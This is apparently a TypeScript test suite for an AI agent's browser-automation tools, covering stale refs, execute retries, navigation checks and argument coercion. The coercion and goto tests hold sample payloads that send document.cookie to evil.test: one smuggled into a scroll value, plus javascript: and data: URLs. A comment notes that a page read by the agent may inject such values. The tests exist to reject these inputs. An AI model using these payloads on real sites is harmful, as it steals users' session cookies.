/**
 * The browser tools' silent failures.
 *
 * Every case here is one where the tool used to answer rather than fail: a
 * stale ref that typed into whatever happened to be focused, a `goto` that
 * reported the page it was already on, an execute that ran a click twice. None
 * of them raised an error, which is why they were expensive — the agent read a
 * success and kept going against a page state that never existed.
 */
import { describe, expect, it } from "vitest";

import {
  chooseOption,
  globToRegexSource,
  isSyntaxError,
  navigationRefusal,
  navigationSettled,
  numericArg,
  parseKeyCombo,
  planExecuteAttempts,
  recipeFor,
  resolveTarget,
  SnapshotStore,
} from "./browser-actions";

const refs = (entries: Record<string, string> = {}): Map<string, string> =>
  new Map(Object.entries(entries));

describe("resolving which element a call means", () => {
  it("maps a live ref to the selector the snapshot recorded", () => {
    const resolved = resolveTarget({ ref: "@e3" }, refs({ "@e3": "#submit" }));

    expect(resolved).toEqual({ kind: "selector", selector: "#submit" });
  });

  it("calls out a ref the current snapshot never issued", () => {
    // The refs are from a page that has since changed. Silently continuing is
    // how `type` ended up appending text to whatever was focused.
    expect(resolveTarget({ ref: "@e9" }, refs({ "@e1": "#a" }))).toEqual({
      kind: "stale-ref",
      ref: "@e9",
    });
  });

  it("does not let a selector argument rescue a stale ref", () => {
    // Both were supplied and they disagree. The ref is what the caller was
    // reasoning about, so a dead ref is an error rather than a reason to act
    // on the other argument.
    const resolved = resolveTarget(
      { ref: "@e9", selector: "#fallback" },
      refs()
    );

    expect(resolved).toEqual({ kind: "stale-ref", ref: "@e9" });
  });

  it("accepts a bare selector when no ref was given", () => {
    expect(resolveTarget({ selector: ".row td" }, refs())).toEqual({
      kind: "selector",
      selector: ".row td",
    });
  });

  it("reports no target rather than an empty selector", () => {
    expect(resolveTarget({}, refs())).toEqual({ kind: "no-target" });
    expect(resolveTarget({ ref: "", selector: "" }, refs())).toEqual({
      kind: "no-target",
    });
  });

  it("ignores a non-string ref instead of stringifying it into a lookup", () => {
    expect(resolveTarget({ ref: 3 }, refs({ "3": "#three" }))).toEqual({
      kind: "no-target",
    });
  });
});

describe("keeping one session's refs out of another's", () => {
  it("gives each session its own ref map", () => {
    const store = new SnapshotStore();

    store.for("session-a").refMap.set("@e5", "#buy-on-page-a");
    store.for("session-b").refMap.set("@e5", "#delete-on-page-b");

    // The bug: one shared map, so B's snapshot replaced A's and A's next click
    // on @e5 resolved to B's selector.
    expect(store.for("session-a").refMap.get("@e5")).toBe("#buy-on-page-a");
    expect(store.for("session-b").refMap.get("@e5")).toBe("#delete-on-page-b");
  });

  it("tracks the URL each session captured its refs on separately", () => {
    const store = new SnapshotStore();

    store.for("a").url = "https://a.test/";
    store.for("b").url = "https://b.test/";

    expect(store.for("a").url).toBe("https://a.test/");
    expect(store.for("b").url).toBe("https://b.test/");
  });

  it("returns the same bucket for a session on every call", () => {
    const store = new SnapshotStore();

    store.for("a").refMap.set("@e1", "#x");

    expect(store.for("a").refMap.get("@e1")).toBe("#x");
    expect(store.sessionCount).toBe(1);
  });

  it("shares one bucket for clients that connected without a session tag", () => {
    const store = new SnapshotStore();

    store.for(undefined).refMap.set("@e1", "#x");

    expect(store.for(undefined).refMap.get("@e1")).toBe("#x");
    expect(store.sessionCount).toBe(1);
  });

  it("drops every session on a navigation, because the pane is shared", () => {
    const store = new SnapshotStore();

    store.for("a").refMap.set("@e1", "#x");
    store.for("b").refMap.set("@e1", "#y");
    store.clearAll();

    expect(store.sessionCount).toBe(0);
    expect(store.for("a").refMap.size).toBe(0);
    expect(store.for("b").refMap.size).toBe(0);
  });

  it("starts a session with no refs and no URL", () => {
    const fresh = new SnapshotStore().for("new");

    expect(fresh.refMap.size).toBe(0);
    expect(fresh.url).toBeNull();
  });
});

describe("planning how to run browser_execute code", () => {
  it("tries a bare expression as a return value first", () => {
    expect(planExecuteAttempts("document.title")).toEqual([
      "return (document.title)",
      "document.title",
    ]);
  });

  it("leaves code that already returns alone, so it runs exactly once", () => {
    expect(planExecuteAttempts("const t = document.title; return t")).toEqual([
      "const t = document.title; return t",
    ]);
  });

  it("recognises a return inside a block", () => {
    expect(planExecuteAttempts("if (window.x) { return 1 }")).toHaveLength(1);
  });

  it("does not mistake the word return inside a string for a statement", () => {
    // This is an expression, and treating it as a statement body made it
    // evaluate to undefined — which reads like the page said no.
    expect(
      planExecuteAttempts(`document.body.innerText.includes('return ')`)
    ).toHaveLength(2);
  });

  it("does not mistake an identifier that starts with return", () => {
    expect(planExecuteAttempts("returnValue")).toHaveLength(2);
  });

  it("only ever offers two attempts, so nothing can run a third time", () => {
    expect(planExecuteAttempts("el.click()")).toHaveLength(2);
  });
});

describe("deciding whether to try the next execute attempt", () => {
  it("advances on a parse failure, which is the guess being wrong", () => {
    expect(isSyntaxError(new Error("SyntaxError: Unexpected token }"))).toBe(
      true
    );
  });

  it("stops on a real page error, which is the answer", () => {
    // Retrying here is what ran a click twice: the first attempt did the work
    // and threw afterwards, or returned undefined having already acted.
    expect(
      isSyntaxError(new Error("TypeError: Cannot read properties of null"))
    ).toBe(false);
    expect(isSyntaxError(new Error("ReferenceError: foo is not defined"))).toBe(
      false
    );
  });

  it("handles a thrown non-Error without crashing the tool", () => {
    expect(isSyntaxError("SyntaxError: bad")).toBe(true);
    expect(isSyntaxError(undefined)).toBe(false);
  });

  it("accepts the Uncaught form CDP reports for a compile failure", () => {
    expect(
      isSyntaxError(new Error("Uncaught SyntaxError: Unexpected end of input"))
    ).toBe(true);
  });

  it("does not treat a page error that merely mentions the word as one", () => {
    // Unanchored, this re-ran code that had already done its work — the
    // double-execution the retry was narrowed to avoid.
    expect(
      isSyntaxError(new Error("Error: SyntaxError in the user config"))
    ).toBe(false);
    expect(
      isSyntaxError(new Error("TypeError: SyntaxError is not a function"))
    ).toBe(false);
  });
});

describe("splitting a key combo", () => {
  it("reads a plain key", () => {
    expect(parseKeyCombo("Enter")).toEqual({ key: "Enter", modifiers: [] });
  });

  it("reads modifiers, lowercased for the mask", () => {
    expect(parseKeyCombo("Control+Shift+a")).toEqual({
      key: "a",
      modifiers: ["control", "shift"],
    });
  });

  it("reads the plus key on its own", () => {
    expect(parseKeyCombo("+")).toEqual({ key: "+", modifiers: [] });
  });

  it("reads a modified plus", () => {
    expect(parseKeyCombo("Control++")).toEqual({
      key: "+",
      modifiers: ["control"],
    });
  });

  it("keeps the modifier on a combo written with one trailing plus", () => {
    // The inline version dropped a trailing segment unconditionally and pressed
    // an unmodified '+' here.
    expect(parseKeyCombo("Shift+")).toEqual({ key: "+", modifiers: ["shift"] });
  });

  it("does not invent a modifier from an empty segment", () => {
    expect(parseKeyCombo("Control++a").modifiers).toEqual(["control"]);
  });
});

describe("coercing a numeric argument before it reaches the page", () => {
  const scroll = (value: unknown): number =>
    numericArg(value, 500, { min: -100_000, max: 100_000 });

  it("passes a plain number through", () => {
    expect(scroll(250)).toBe(250);
    expect(scroll(-250)).toBe(-250);
  });

  it("accepts the string a model often sends instead of a number", () => {
    expect(scroll("250")).toBe(250);
  });

  it("falls back rather than splicing a non-number into the page source", () => {
    // These went into `window.scrollBy(${dx}, 0)` verbatim. The last one is the
    // reason this function exists: the model picks this value, and it picks it
    // after reading a page that may have told it to.
    expect(scroll("abc")).toBe(500);
    expect(scroll(undefined)).toBe(500);
    expect(scroll(null)).toBe(500);
    expect(scroll("")).toBe(500);
    expect(scroll("   ")).toBe(500);
    expect(scroll({})).toBe(500);
    expect(scroll('0); fetch("https://evil.test/"+document.cookie); (0')).toBe(
      500
    );
  });

  it("rejects the infinities, which are finite-looking to a cast", () => {
    expect(scroll(Number.POSITIVE_INFINITY)).toBe(500);
    expect(scroll(Number.NaN)).toBe(500);
  });

  it("clamps to the bounds instead of trusting the caller", () => {
    expect(scroll(10_000_000)).toBe(100_000);
    expect(scroll(-10_000_000)).toBe(-100_000);
  });

  it("truncates, so the interpolated source is always an integer literal", () => {
    expect(scroll(12.7)).toBe(12);
  });

  it("bounds a wait, because an unbounded one is a hung turn", () => {
    expect(numericArg(60_000, 5000, { min: 0, max: 120_000 })).toBe(60_000);
    expect(numericArg(3_600_000, 5000, { min: 0, max: 120_000 })).toBe(120_000);
    expect(numericArg(-1, 5000, { min: 0, max: 120_000 })).toBe(0);
  });
});

describe("turning a URL glob into a regex", () => {
  const matches = (pattern: string, url: string): boolean =>
    new RegExp(globToRegexSource(pattern)).test(url);

  it("spans path separators for a doubled star", () => {
    expect(
      matches("**/results**", "https://example.com/a/b/results?page=2")
    ).toBe(true);
  });

  it("stops a single star at a path separator", () => {
    expect(matches("https://example.com/*", "https://example.com/a")).toBe(
      true
    );
    expect(matches("https://example.com/*", "https://example.com/a/b")).toBe(
      false
    );
  });

  it("treats a question mark in the pattern as a literal", () => {
    // Escaped as a regex metacharacter it would make the previous character
    // optional, so "/results" would match a pattern asking for "/resultspage".
    expect(
      matches("**/results?page=1", "https://example.com/results?page=1")
    ).toBe(true);
    expect(
      matches("**/results?page=1", "https://example.com/result?page=1")
    ).toBe(false);
  });

  it("anchors, so a pattern cannot match a longer URL by accident", () => {
    expect(matches("https://example.com/a", "https://example.com/a/b")).toBe(
      false
    );
  });

  it("treats dots as literals", () => {
    expect(matches("https://example.com/**", "https://exampleXcom/a")).toBe(
      false
    );
  });
});

describe("deciding what goto may load", () => {
  it("allows the ordinary web", () => {
    expect(navigationRefusal("https://example.com/a")).toBeNull();
    expect(navigationRefusal("http://127.0.0.1:5173/")).toBeNull();
  });

  it("allows a local file, which is a normal thing to preview", () => {
    expect(navigationRefusal("file:///tmp/build/index.html")).toBeNull();
  });

  it("refuses javascript:, which would run in whatever page is loaded", () => {
    const refusal = navigationRefusal(
      'javascript:fetch("https://evil.test/?c="+document.cookie)'
    );

    expect(refusal).toContain("Refusing");
    expect(refusal).toContain("browser_execute");
  });

  it("refuses javascript: however it is cased", () => {
    expect(navigationRefusal("JavaScript:alert(1)")).toContain("Refusing");
  });

  it("refuses data:, which is the same trick with a document attached", () => {
    expect(
      navigationRefusal(
        'data:text/html,<script>fetch("https://evil.test")</script>'
      )
    ).toContain("Refusing");
  });

  it("says so when the string is not a URL at all", () => {
    expect(navigationRefusal("example.com")).toContain("scheme");
  });
});

describe("deciding when a navigation has landed", () => {
  const base = {
    loading: false,
    currentUrl: "https://example.com/results",
    startUrl: "https://example.com/search",
    targetHost: "example.com",
    sawLoading: true,
    elapsedMs: 0,
    graceMs: 1500,
  };

  it("accepts a load that finished on the target host", () => {
    expect(navigationSettled(base)).toBe(true);
  });

  it("waits while the view is still loading", () => {
    expect(navigationSettled({ ...base, loading: true })).toBe(false);
  });

  it("does not answer before the navigation has started", () => {
    // The bug: goto to another path on the host the view is already on. The
    // first poll ran before loadURL took effect, the host matched, and the tool
    // reported success quoting the URL it had not left yet.
    expect(
      navigationSettled({
        ...base,
        currentUrl: "https://example.com/search",
        sawLoading: false,
      })
    ).toBe(false);
  });

  it("accepts a URL that changed even if loading was never observed", () => {
    // A cached or same-document navigation can complete between two polls.
    expect(navigationSettled({ ...base, sawLoading: false })).toBe(true);
  });

  it("accepts a redirect that kept the host", () => {
    expect(
      navigationSettled({
        ...base,
        currentUrl: "https://example.com/results/",
        targetHost: "example.com",
      })
    ).toBe(true);
  });

  it("keeps waiting when the view landed somewhere else", () => {
    expect(
      navigationSettled({
        ...base,
        currentUrl: "https://accounts.google.com/signin",
      })
    ).toBe(false);
  });

  it("keeps waiting on about:blank, which has no host", () => {
    expect(navigationSettled({ ...base, currentUrl: "about:blank" })).toBe(
      false
    );
  });

  it("keeps waiting on a URL that will not parse at all", () => {
    // A view mid-teardown reports an empty URL.
    expect(navigationSettled({ ...base, currentUrl: "" })).toBe(false);
  });

  it("stops demanding evidence once the grace period is up", () => {
    // A goto to the URL already open never goes loading between two polls and
    // never changes the URL, so requiring evidence indefinitely would stall it
    // for the whole navigation timeout on a page that was already there.
    const sameUrl = { ...base, currentUrl: base.startUrl, sawLoading: false };

    expect(navigationSettled({ ...sameUrl, elapsedMs: 400 })).toBe(false);
    expect(navigationSettled({ ...sameUrl, elapsedMs: 1500 })).toBe(true);
  });

  it("still refuses a wrong host after the grace period", () => {
    expect(
      navigationSettled({
        ...base,
        currentUrl: "https://other.test/",
        sawLoading: false,
        elapsedMs: 9999,
      })
    ).toBe(false);
  });

  describe("with no destination, which is back / forward / reload", () => {
    const history = { ...base, targetHost: null };

    it("accepts any host once the view has finished", () => {
      // Going back can land on a different site than the one in view.
      expect(
        navigationSettled({ ...history, currentUrl: "https://elsewhere.test/" })
      ).toBe(true);
    });

    it("still waits while loading", () => {
      expect(navigationSettled({ ...history, loading: true })).toBe(false);
    });

    it("does not answer before the view has left, which is what reload did", () => {
      // A reload returns to the same URL, so only having been seen loading
      // distinguishes "finished" from "not started".
      expect(
        navigationSettled({
          ...history,
          currentUrl: history.startUrl,
          sawLoading: false,
          elapsedMs: 0,
        })
      ).toBe(false);
    });

    it("settles a reload once it was seen loading", () => {
      expect(
        navigationSettled({
          ...history,
          currentUrl: history.startUrl,
          sawLoading: true,
        })
      ).toBe(true);
    });

    it("gives up demanding evidence after the grace period", () => {
      expect(
        navigationSettled({
          ...history,
          currentUrl: history.startUrl,
          sawLoading: false,
          elapsedMs: 1500,
        })
      ).toBe(true);
    });
  });
});

describe("choosing an autocomplete suggestion", () => {
  const options = [
    { ref: "@e1", name: "New Delhi, India (DEL)" },
    { ref: "@e2", name: "Delhi Cantt" },
    { ref: "@e3", name: "Delft, Netherlands" },
    { ref: "@e4", name: "" },
  ];

  it("takes an exact label before a partial one", () => {
    expect(chooseOption(options, "delhi cantt")?.ref).toBe("@e2");
  });

  it("takes a label that starts with the text before one that merely contains it", () => {
    expect(chooseOption(options, "Delf")?.ref).toBe("@e3");
    expect(chooseOption(options, "Delhi")?.ref).toBe("@e2");
    expect(chooseOption(options, "cantt")?.ref).toBe("@e2");
  });

  it("falls back to the first word for a multi-word request", () => {
    expect(chooseOption(options, "Delhi airport terminal 3")?.ref).toBe("@e1");
  });

  it("refuses rather than guessing when nothing fits", () => {
    expect(chooseOption(options, "Mumbai")).toBeNull();
    expect(chooseOption(options, "   ")).toBeNull();
  });

  it("never picks an unlabelled option", () => {
    expect(chooseOption([{ ref: "@e9", name: "" }], "x")).toBeNull();
  });
});

describe("site recipes", () => {
  it("knows Google and its country domains", () => {
    expect(recipeFor("https://www.google.com/travel/flights")).toContain(
      "autocomplete"
    );
    expect(recipeFor("https://www.google.co.in/search?q=x")).not.toBeNull();
  });

  it("knows Amazon's result rows", () => {
    expect(recipeFor("https://www.amazon.in/s?k=cable")).toContain(
      "s-search-result"
    );
  });

  it("has nothing to say about an unknown site or a bad URL", () => {
    expect(recipeFor("https://example.test/")).toBeNull();
    expect(recipeFor("not a url")).toBeNull();
  });

  it("does not match a lookalike host", () => {
    expect(recipeFor("https://notgoogle.com/")).toBeNull();
    expect(recipeFor("https://google.com.evil.test/")).toBeNull();
  });
});
